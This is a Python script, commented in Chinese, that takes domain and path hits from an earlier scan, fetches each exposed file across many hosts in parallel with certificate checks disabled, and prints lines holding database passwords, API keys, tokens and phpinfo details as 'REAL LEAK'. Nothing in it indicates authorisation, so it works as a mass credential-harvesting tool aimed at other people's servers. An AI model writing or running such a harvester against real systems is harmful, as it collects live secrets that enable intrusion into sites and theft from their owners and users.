#!/usr/bin/env python3
"""verify_auth_leaks.py - 批量验证auth-leak命中, 筛出真实凭据泄露"""
import urllib.request, ssl, socket, re
from concurrent.futures import ThreadPoolExecutor, as_completed

socket.setdefaulttimeout(8)
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}

# 从fv_generic_hits.txt提取auth-leak命中
def load_targets():
    targets = []
    for line in open('/tmp/fv_generic_hits.txt'):
        parts = line.strip().split('|')
        if len(parts) >= 3 and parts[0] == 'auth-leak':
            targets.append((parts[1], parts[2]))
    return targets

def fetch(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(8000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read(8000).decode('utf-8','ignore')
    except Exception:
        return 0, ''

CRED_KEYS = ['db_password', 'dbpass', 'password', 'passwd', 'secret', 'api_key', 'apikey',
             'app_key', 'access_key', 'token', 'mysql', 'database', 'db_user', 'dbuser',
             'username', 'pwd', 'auth', 'admin_pass', 'cfg_dbpwd']

def verify(item):
    dom, path = item
    st, b = fetch('http://'+dom+path)
    if st != 200 or len(b) < 50:
        return None
    low = b.lower()
    # 排除HTML页面(误报)
    if '<html' in low[:200] or '<!doctype' in low[:200] or '<head' in low[:300]:
        # 但phpinfo.php是HTML含敏感信息, 单独判断
        if 'php version' not in low and 'server_root' not in low and 'server_addr' not in low:
            return None
    # 找真实凭据特征
    hits = [k for k in CRED_KEYS if k in low]
    if hits:
        # 提取含凭据的行
        cred_lines = []
        for line in b.split('\n'):
            if any(k in line.lower() for k in ['password', 'passwd', 'pwd', 'secret', 'key', 'user', 'db']):
                if len(line) < 200 and '=' in line or ':' in line:
                    cred_lines.append(line.strip()[:150])
        return (dom, path, hits, cred_lines[:8])
    return None

def main():
    targets = load_targets()
    print('auth-leak targets: %d' % len(targets), flush=True)
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(verify, t): t for t in targets}
        for fu in as_completed(futs):
            r = fu.result()
            if r:
                dom, path, hits, creds = r
                print('\n=== REAL LEAK: %s %s ===' % (dom, path), flush=True)
                print('  特征:', hits, flush=True)
                for c in creds:
                    print('  ', c, flush=True)

if __name__ == '__main__':
    main()
